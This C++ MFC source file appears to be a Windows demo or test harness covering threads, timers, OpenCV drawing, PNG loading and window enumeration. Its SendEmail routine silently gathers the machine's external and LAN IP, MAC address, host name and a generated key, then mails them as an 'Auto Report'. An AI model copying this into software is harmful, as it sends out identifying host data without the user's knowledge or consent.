#include "stdafx.h"
#include "resource.h"

#include "FormatChange.h"
#include "Example.h"
#include "BaseVersionDlg.h"
#include "png.h"
#include "stdarg.h"
#include "MailClient.h"
#include "NetControl.h"

/*************************************************************************************/
//构造、析构函数
Example::Example(){

}

Example::~Example(){

}
/*************************************************************************************/
//主窗体操作
void Example::Init(void)
{
	printf("测试开始\r\n");
}

void Example::Exit(void)
{
	printf("测试结束\r\n");
}



/*************************************************************************************/
//线程测试
DWORD WINAPI ThreadTestProc(LPVOID pParam)
{
	Example *Ex = (Example *)pParam;
	Ex->PrintfFile("[Example][ThreadTestProc]线程休眠\r\n");
	Sleep(1000);
	Ex->PrintfFile("[Example][ThreadTestProc]线程结束\r\n");
	return 0;
}

void Example::ThreadTest(void){
	printffile("线程测试开始\r\n");
	AfxBeginThread((AFX_THREADPROC)ThreadTestProc,this,THREAD_PRIORITY_HIGHEST);
	printffile("线程已经创建\r\n");
}
/*************************************************************************************/
//时间操作测试
void Example::TimerTest(void){

	printffile("时间测试开始\r\n");

	clock_t TimeStart,TimeEnd;
	unsigned int TimeSpend;
	TimeStart = clock();
	Sleep(100);
	TimeEnd = clock();

	TimeSpend = TimeEnd - TimeStart;

	printffile("时间间隔:%u毫秒\r\n",TimeSpend);

	CTime time = CTime::GetCurrentTime();   ///构造CTime对象
#if 0
	int m_nYear = time.GetYear();      ///年
	int m_nMonth = time.GetMonth();      ///月
	int m_nDay = time.GetDay();      ///日
	int m_nHour = time.GetHour();      ///小时
	int m_nMinute = time.GetMinute();   ///分钟
	int m_nSecond = time.GetSecond();   ///秒
#endif
	CString m_strTime = time.Format("%Y-%m-%d %H:%M:%S");
	m_strTime += (CString)("\r\n");
	printfcstringfile(m_strTime);
	printffile("时间测试完成\r\n");

}

/*************************************************************************************/
//文件操作测试
void Example::FileOperation(void){
	printffile("文件操作测试开始\r\n");

	const char data[] = {"This is a test program"};
	CFile mFile(_T("../Output/Test.txt"),CFile::modeCreate | CFile::modeReadWrite);
	mFile.Write(data,sizeof(data));
	mFile.Close();

	printffile("文件操作测试完成\r\n");

}

/*************************************************************************************/
//进度条测试

void Example::ProcessCtrl(int Num){

    CBaseVersionDlg *MainDlg = (CBaseVersionDlg *)AfxGetMainWnd();
	MainDlg->ProcessCtrl(Num);
}

DWORD WINAPI ProcessTestThread(LPVOID pParam)
{
	Example *Ex = (Example *)pParam;
	Ex->PrintfFile("[Example][ProcessTestThread]进度条操作测试开始\r\n");
	for(int i=0;i<100;i++){
		Sleep(100);
		Ex->ProcessCtrl(i);
	}
	Ex->PrintfFile("[Example][ProcessTestThread]进度条操作测试结束\r\n");
	return 0;
}

void Example::ProcessTest(void){
	AfxBeginThread((AFX_THREADPROC)ProcessTestThread,this,THREAD_PRIORITY_HIGHEST);
}
/*************************************************************************************/
void Example::NetTest(void){
	net_control NetCHdlr;
	printffile("网络相关测试开始\r\n");
	CString IPCString;
	IPCString = NetCHdlr.get_localip();
	IPCString = (CString)("本机局域网IP地址:")+ IPCString + (CString)("\r\n");
	printfcstringfile(IPCString);

	IPCString = NetCHdlr.get_netip();
	IPCString = (CString)("本机网络IP地址:")+ IPCString + (CString)("\r\n");
	printfcstringfile(IPCString);
	printffile("网络相关测试结束\r\n");
}
/*************************************************************************************/
//Windows CMD命令操作测试
void Example::WinCMDTest(void){
	printffile("Windows CMD命令测试:ipconfig\r\n");
	WinExec("cmd.exe /C ipconfig&&pause", SW_SHOWNORMAL);
}

void Example::OpencvFillRectangle(IplImage* img,UINT32 Startx,UINT32 Starty,UINT32 Endx,UINT32 Endy){
	CvPoint pt2[4] = {cvPoint(Startx,Starty),cvPoint(Endx,Starty),cvPoint(Endx,Endy),cvPoint(Startx,Endy)};
	cvFillConvexPoly(img,pt2,4,CV_RGB(0,0,0)); 
}

void on_Mouse(int event, int x, int y, int flags, void *ustc)//event鼠标事件代号，x,y鼠标坐标，flags拖拽和键盘操作的代号
{ 
	CString TempCString;
	Example *Ex = (Example *)ustc;

	if (event == CV_EVENT_MOUSEMOVE)//移动
	{
		//TempCString.Format(_T("(%d,%d)\r\n"),x,y);
		//CBaseVersionDlg *MainDlg = (CBaseVersionDlg *)AfxGetMainWnd();
		//MainDlg->PathEditCtrl(TempCString);
	}else if(event == CV_EVENT_LBUTTONDOWN){	//左单击
		TempCString.Format(_T("(%d,%d)\r\n"),x,y);
		AfxMessageBox(TempCString);
	}
}

void Example::OpencvTest(void)
{
	//IplImage *img = cvLoadImage("../Input/OpencvTest.jpg");
	//cvNamedWindow("Opencv测试",CV_WINDOW_AUTOSIZE);
	//cvShowImage("Opencv测试",img);

	IplImage *img2 = cvCreateImage(cvSize(800,800),8,3);

	{	//写字测试
		char temp[16];
		int x  = 13 , y = 14;
		CvPoint pt = cvPoint(20,20); 
		CvFont font;   
		cvInitFont(&font, CV_FONT_HERSHEY_SIMPLEX, 0.5, 0.5, 0, 1, CV_AA);   
		sprintf(temp,"(%d,%d)",x,y);   
		cvPutText(img2,temp, pt, &font, CV_RGB(255,0,0));   
	}
	
	{	//画圆测试,5是大小
		CvPoint pt = cvPoint(50,50); 
		cvCircle(img2, pt, 5,CV_RGB(255,0,0) ,CV_FILLED, CV_AA, 0 );   
	}

	{	//画线测试
		cvLine(img2,cvPoint(100,100),cvPoint(200,200),CV_RGB(0,255,255));
	}

	{	//画方形测试
        cvRectangle(img2, cvPoint(50,50), cvPoint(100,100), CV_RGB(255,255,255));  
		//画填充形状
		#define PointNum 4
		CvPoint pt1[PointNum] = {cvPoint(200,200),cvPoint(300,210),cvPoint(230,260),cvPoint(210,300)};
		cvFillConvexPoly(img2,pt1,PointNum,CV_RGB(250,0,0)); 

		this->OpencvFillRectangle(img2,400,400,500,500);

	}

	cvNamedWindow("Opencv自绘图",CV_WINDOW_AUTOSIZE);
	cvSetMouseCallback("Opencv自绘图", on_Mouse, this);
	cvShowImage("Opencv自绘图",img2);

}

//主要是CString 是 UNICODE的格式.
void Example::FormatTest(void){
	char TestChar[] = {"Hello\r\n"};
	CString TestCString = this->g_FormatHandle.CharToCString(TestChar);			//Char->CString

	CString TestCString2("How old are you?");
	char TestChar2[1000];
	int Len = this->g_FormatHandle.CStringToChar(TestCString2,TestChar2);		//CString -> Char, Len = 17.
	
	CString TestCString3("123456");
	int TestInt = this->g_FormatHandle.CStringToInt(TestCString3);				//CString->Int

	int TempNum = 112233;
	CString TestCString4 = this->g_FormatHandle.IntToCString(TempNum);			//Int->CString
}

void Example::ScanWindowTest(void){
	FormatChange FC;
	Png PngHdlr(IDC_STATIC);
//1.先获得桌面窗口
    CWnd* pDesktopWnd = CWnd::GetDesktopWindow();
//2.获得一个子窗口
    CWnd* pWnd = pDesktopWnd->GetWindow(GW_CHILD);
//3.循环取得桌面下的所有子窗口
    while(pWnd != NULL)
    {
       
		WCHAR TempWchar[256];
		char ClassTempChar[512];
		char WinTempChar[512];
		CString TempCString;
		 //获得窗口类名
		memset(TempWchar,0,sizeof(TempWchar));
		memset(ClassTempChar,0,sizeof(ClassTempChar));
		::GetClassName(pWnd->GetSafeHwnd(),TempWchar,sizeof(TempWchar)/sizeof(WCHAR));
		TempCString.Format(_T("类:%ws"),TempWchar);
		printfcstringfile(TempCString);
		FC.WcharToChar(TempWchar,ClassTempChar);

        //获得窗口标题
		memset(TempWchar,0,sizeof(TempWchar));
		memset(WinTempChar,0,sizeof(WinTempChar));
        ::GetWindowText(pWnd->GetSafeHwnd(),TempWchar,sizeof(TempWchar)/sizeof(WCHAR));
		TempCString.Format(_T("窗体:%ws\r\n"),TempWchar);
		printfcstringfile(TempCString);
		FC.WcharToChar(TempWchar,WinTempChar);
#if 1
		if(strcmp(ClassTempChar,"Photo_Lightweight_Viewer") == 0  &&  strcmp(WinTempChar,"52839202_12.png - Windows Photo Viewer") == 0){
			pWnd = pWnd->GetWindow(GW_CHILD);
			while(pWnd!=NULL){
				memset(TempWchar,0,sizeof(TempWchar));
				memset(ClassTempChar,0,sizeof(ClassTempChar));
				::GetClassName(pWnd->GetSafeHwnd(),TempWchar,sizeof(TempWchar)/sizeof(WCHAR));
				FC.WcharToChar(TempWchar,ClassTempChar);
				if(strcmp(ClassTempChar,"Photos_PhotoCanvas") == 0){
					this->ShowCwnd(pWnd,WinTempChar);
				}
				pWnd = pWnd->GetWindow(GW_HWNDNEXT);
			}
			pWnd = pWnd->GetParent();
		}
#endif
        pWnd = pWnd->GetWindow(GW_HWNDNEXT);
    }
}

void Example::PNGTest(void)
{	
	Png PngHdlr(IDC_STATIC);
	PngHdlr.Open("../Input/test.png");
}

/*
Key 37 = Left
Key 38 = Up
Key 39 = Right
Key 40 = Down
*/
void Example::DlgMsgListen(int MessageID)
{
	this->Printf("DlgMsgID = %d\r\n",MessageID);

	if(MessageID == 38)	//抓取控件UI测试 
		this->ShowCwnd(this->IDToCWnd(IDC_STATIC),"Win");
}

void Example::SendEmail(void)
{
	mail_client MailHdlr;
	net_control NetCHdlr;

	CString NetIp;
	CString LocalIp;
	CString PCName;
	CString MailContext;
	CString MAC;
	CString Password;

	NetIp = NetCHdlr.get_netip();				//获取IP地址信息
	NetIp = CString("[外网IP:") + NetIp + CString("]\n");
	LocalIp = NetCHdlr.get_localip();
	LocalIp = CString("[局域网IP:") + LocalIp + CString("]\n");
	MAC = NetCHdlr.get_mac();
	MAC = CString("[网卡地址:") + MAC + CString("]\n");
	PCName = NetCHdlr.get_pcname();
	PCName = CString("[主机名:") + PCName + CString("]\n");
	Password = NetCHdlr.CreatePawword();
	Password = CString("[秘钥:") + Password + CString("]\n");


	MailHdlr.SetMailSubject(CString("Auto Report"));

	MailContext = NetIp + LocalIp + MAC + PCName + Password + CString("	I'm using the Example software.");

	MailHdlr.SetMailContext(MailContext);
	
	MailHdlr.Send();
}